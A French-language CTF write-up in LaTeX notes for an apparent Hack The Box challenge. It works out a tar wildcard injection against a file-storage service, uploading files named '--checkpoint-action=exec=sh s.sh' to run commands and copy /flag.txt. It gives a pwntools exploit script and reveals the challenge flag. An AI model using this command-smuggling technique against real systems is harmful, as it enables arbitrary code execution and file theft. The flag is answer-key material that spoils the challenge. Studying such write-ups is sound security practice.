\section{Micro Storage}

Keywords: tar wildcard exploit

donc on ne peut pas upload \verb+/flag.txt+

\subsection{Fonction upload}

fonctionnement normal: on défini un nom de fichier et on saisi jusqu'a saisir
EOF
\begin{verbatim}
>>> Choose an option: 1
[*] Enter your file name: /flag.txt
[-] No no no, you're trying to hack us, good bye.
\end{verbatim}

ce qui est etrange c'est qu'il demande le nom de fichier avant de réaliser
qu'on n'a plus de place dispo
\begin{verbatim}
>>> Choose an option: 1
[*] Enter your file name: 11
[-] You have exceeded the number of allowed files.
\end{verbatim}


\subsection{Fonction Download}

renvoie un base64.

\begin{verbatim}
$ cat download |base64 -d
flag.txt0000644000175000017500000000000514357000520012411 0ustar  storagestorageflag
\end{verbatim}

il prend on compte les espaces dans les fichier mais pas dans le text
\begin{verbatim}
$ cat download |base64 -d
1.txt 0000644000175000017500000000000214357001221011674 0ustar  storagestorage1
2.txt 0000644000175000017500000000000214357001242011700 0ustar  storagestorage2
1.txt toto0000644000175000017500000000000214357001420012603 0ustar  storagestorage1
\end{verbatim}

donc cela ressemble a:
\begin{itemize}
    \item nom de fichier
    \item ??
    \item user
    \item group
    \item content
\end{itemize}



on va se servir de pwntools pour interagir car ca gonfle.

donc quand on base64 decode depuis python et si on envoie
\begin{verbatim}
test
test
EOF
\end{verbatim}
on obtient
\begin{verbatim}
toto\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x000000644\x00001750\x00001750\x000000000012\x0
04357125575\x0011667\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar \x00torag
e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00torage\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
²&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00test
test
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
\end{verbatim}

\verb+ustar+ unique standard tape archiver 

\verb+Star+ is a very fast tar(1) like tape archiver with improved functionality.

voila la raison de tous les 0:
\begin{verbatim}
artype=headertype

If the ustar format has been selected, star will not use enhancements to the POSIX.1-1988 tar format, the archive will be strictly conforming. File size is limited to 8 GB, uid/gid/major/minor is limited to 2097151. Sparse files will be filled up with zeroes.
\end{verbatim}

Donc je ne pense pas que cela passe par le contenu mais plutot par le nom du
fichier car on a le droit aux espaces....

donc il faudrait que l'on ai un nom de fichier qui soit interpreté et nous
permette d'archiver le flag.

par contre les \verb+..+ ne passent pas ni les \verb+/+

ls \verb+ln -s+ semble passer.

\verb+toto *+ ne passe pas.

donc il faut trouver une option de \verb+ustar+

ce qui passe 
\begin{itemize}
    \item \verb+toto . titi+
\end{itemize}

ce qui ne passe pas:
\begin{itemize}
    \item \verb+toto ${PATH:0:1}+ ne passe pas pour obtenir \verb+\+
    \item ni \verb+$ { : }+
    \item ni \verb+;+
    \item ni \verb+%+
    \item ni \verb+\ /+
\end{itemize}
\verb+toto ${PATH:0:1}+ ne passe pas pour obtenir \verb+\+

options interessantes
\begin{verbatim}
-C dir 
    Perform a chdir(2) operation to dir before storing or extracting the next files
-D 
    Do not descend directories.

-find

This option acts a separator. If it is used, all star options must be to the left of the -find option. To the right of the -find option, star accepts the find command line syntax only.
\end{verbatim}

bon testons si c'est bien par le nom du fichier que l'on peut exploit. Il faut
trouver une option relativement safe pour valider.

\verb+-C+ semble la plus interessante
\begin{verbatim}
-C dir

Perform a chdir(2) operation to dir before storing or extracting the next
files. In all cases, star will perform the chdir(2) operation relative to the
current working directory of the shell.

    In create mode (with the -c, -r and -u flag), star walks through all -C
    options and file type arguments. While a BSD derived tar(1) implementation
    goes back to the current working directory after storing one file argument
    that immediately follows the -C option, star changes the directory only if
    a new -C option follows. To emulate the behavior of a BSD derived tar(1),
    add a -C . option after the file argument.
\end{verbatim}

donc on devrait pouvoir enchainer les \verb+-C .. flag.txt+

en fait il ne semble pas prendre le flag car il l'affiche dans le nom.

quand on enchaine 
\begin{verbatim}
[*] Enter your file name: -C .. 1
[*] Enter your file name: -C .. 2
[*] Enter your file name: -C .. 4
[*] Enter your file name: -C .. 5
[*] Enter your file name: -C .. flag.txt
>>> Choose an option: 5
[-] Your files are empty, nothing to download.
[*] Enter your file name: 7
toto
EOF
>>> Choose an option: 5
[+] Your base64 encoded archive:
\end{verbatim}

on ne récupere pas le fichier


il semble qu'il prenne les fichier dans l'ordre des noms

\begin{verbatim}
$ cat download |base64 -d
a_file C=..0000644000175000017500000000001414357253307012512 0ustar  storagestorage- content -
b_file C=..0000644000175000017500000000001414357253310012505 0ustar  storagestorage- content -
c_file C=..0000644000175000017500000000001414357253310012506 0ustar  storagestorage- content -
d_file C=..0000644000175000017500000000001414357253310012507 0ustar  storagestorage- content -
flag.txt0000644000175000017500000000001414357253310012420 0ustar  storagestorage- content -
\end{verbatim}

ne marche pas

on va donc essayer l'exploit classic de tar


\begin{verbatim}
--checkpoint-action=exec=sh script.sh
[-] File name is too long.
$ --checkpoint-action=exec=sh s.sh
[-] No such option.

\end{verbatim}

\begin{verbatim}
def create_file(name, content = '- content -'):
    io.recvuntil('>>> Choose an option: ')
    io.sendline('1')
    io.sendlineafter('[*] Enter your file name: ', name)
    io.recvline()
    io.sendline(content)
    io.sendline("EOF")

def download():
    io.recvuntil('>>> Choose an option: ')
    io.sendline('5')
    io.recvline()
    data= io.recvuntil('\n', drop=True, timeout=3600)
    with open('download', 'wb') as f:
        f.write(data)

io = start()
create_file("flag.txt")
create_file(f's.sh', 'ping -c 3 10.10.16.6')
create_file(f'--checkpoint=1')
create_file(f'--checkpoint-action=exec=sh s.sh')
download()

[*] Fetching your uploaded files...
[*] 0. flag.txt
[*] 1. s.sh
[*] 2. --checkpoint=1
[*] 3. --checkpoint-action=exec=sh s.sh


flag.txt0000644000175000017500000000001414357255202012422 0ustar  storagestorage- content -
s.sh0000644000175000017500000000002514357255202011550 0ustar  storagestorageping -c 3 10.10.16.6
\end{verbatim}

les fichiers existent bien mais ne sont pas inclus dans l'archive. Cela
signifie qu'ils sont bien pris comme des actions.

donc le ping ne passerait pas ?

donc on va passer par la copy de \verb+/flag.txt flag.txt+ par contre il faut
faire 2 download le prmier qui lance la copie et le second qui export le flag.

\begin{verbatim}
io = start()
create_file("flag.txt")
create_file(f's.sh', 'cp /flag.txt flag.txt')
create_file(f'--checkpoint=1')
create_file(f'--checkpoint-action=exec=sh s.sh')
download()
download()

$cat download |base64 -d
flag.txt0000644000175000017500000000010314357256064012430 0ustar  storagestorageHTB{@bus1Ng_gTf0_b1N$_c4n_b3_fUn_s0m3t1meS__r1g|-|t??!!__c4fdecf8}
s.sh0000644000175000017500000000002614357256064011560 0ustar  storagestoragecp /flag.txt flag.txt
\end{verbatim}
